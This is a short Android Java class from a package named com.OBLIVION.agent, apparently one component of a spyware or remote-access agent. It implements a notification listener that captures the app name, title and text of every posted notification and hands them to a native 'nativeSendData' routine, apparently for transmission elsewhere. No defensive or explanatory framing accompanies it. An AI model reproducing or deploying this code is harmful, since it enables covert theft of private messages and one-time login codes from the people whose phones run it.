package com.OBLIVION.agent;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String packageName = sbn.getPackageName();
        String title = sbn.getNotification().extras.getString("android.title");
        String text = sbn.getNotification().extras.getString("android.text");
        
        OBLIVIONService service = new OBLIVIONService();
        service.nativeSendData("notification", "{\"app\":\"" + packageName + "\",\"title\":\"" + title + "\",\"text\":\"" + text + "\"}");
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Notification removed
    }
}